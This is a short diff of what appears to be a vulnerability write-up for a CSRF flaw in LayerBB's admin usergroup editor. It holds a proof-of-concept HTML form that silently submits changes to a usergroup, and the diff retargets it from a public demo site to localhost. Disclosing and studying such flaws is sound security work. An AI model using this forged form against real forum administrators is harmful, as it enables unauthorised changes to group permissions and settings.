@@ -3,9 +3,9 @@ Allows for the usergroup to be edited through CSRF.
 
 ## PoC:
 ```html
-<link rel="stylesheet" href="https://demo.layerbb.com/public/admin/bower_components/bootstrap/dist/css/bootstrap.min.css">
+<link rel="stylesheet" href="http://localhost/public/admin/bower_components/bootstrap/dist/css/bootstrap.min.css">
 
-<form action="https://demo.layerbb.com/admin/edit_usergroup.php/id/1" method="POST" style="padding: 25px;">
+<form action="http://localhost/admin/edit_usergroup.php/id/1" method="POST" style="padding: 25px;">
     <label for="g_name">Name</label>
     <input type="text" name="g_name" id="g_name" value="User" class="form-control">
     <label for="g_style">Style <small><code>%username%</code> will be replaced with the user's username.</small></label>
